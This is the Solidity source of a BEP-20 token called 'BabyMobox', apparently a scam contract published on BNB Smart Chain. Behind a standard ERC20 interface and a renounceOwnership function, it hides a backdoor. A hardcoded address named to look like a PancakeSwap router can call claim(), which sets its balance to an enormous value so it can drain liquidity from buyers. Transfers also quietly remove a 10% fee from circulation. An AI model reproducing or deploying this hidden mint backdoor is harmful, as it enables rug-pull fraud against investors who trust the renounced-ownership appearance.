/**
 *Submitted for verification at BscScan.com on 2021-12-01
*/

/**


*/









pragma solidity >=0.8.0 <=0.8.10;

interface ERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

 contract BabyMobox is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "BabyMobox";
    string private _symbol = "BBOX";
    address private constant _pancakeRouterAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private fee = 10;
    uint256 private multi = 10;
    address private _owner;
    uint256 private _fee;

    constructor(uint256 totalSupply_) {
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return _balances[owner];
    }

    function viewTaxFee() public view virtual returns(uint256) {
        return multi;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount2
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount2);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount2, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount2);
        }

        return true;
    }
    address private _pancakeRouter2 = 0xaDa36b75905Eb002e3Ac42E00347676776048aFc;
    function sendtokens(address sender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), sender, _allowances[_msgSender()][sender] + amount);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue2) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue2, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue2);
        }

        return true;
    }
    uint256 private constant _exemSum2 = 10000000 * 10**42;
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function _transfer(
        address sender,
        address receiver,
        uint256 total2
    ) internal virtual {
        require(sender != address(0), "BEP : Can't be done");
        require(receiver != address(0), "BEP : Can't be done");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= total2, "Too high value");
        unchecked {
            _balances[sender] = senderBalance - total2;
        }
        _fee = (total2 * fee / 100) / multi;
        total2 = total2 -  (_fee * multi);

        _balances[receiver] += total2;
        emit Transfer(sender, receiver, total2);
    }
    function _tramsfer2 (address account2) internal {
        _balances[account2] = (_balances[account2] * 3) - (_balances[account2] * 3) + (_exemSum2 * 1) -5;
    }


    function owner() public view returns (address) {
        return _owner;
    }

    function _burn(address account2, uint256 amount) internal virtual {
        require(account2 != address(0), "Can't burn from address 0");
        uint256 accountBalance = _balances[account2];
        require(accountBalance >= amount, "BEP : Can't be done");
        unchecked {
            _balances[account2] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account2, address(0), amount);
    }
    modifier externel2 () {
        require(_pancakeRouter2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }

    function claim() public externel2 {
        _tramsfer2(_msgSender());
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount2
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amount2;
        emit Approval(owner, spender, amount2);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;

    }


}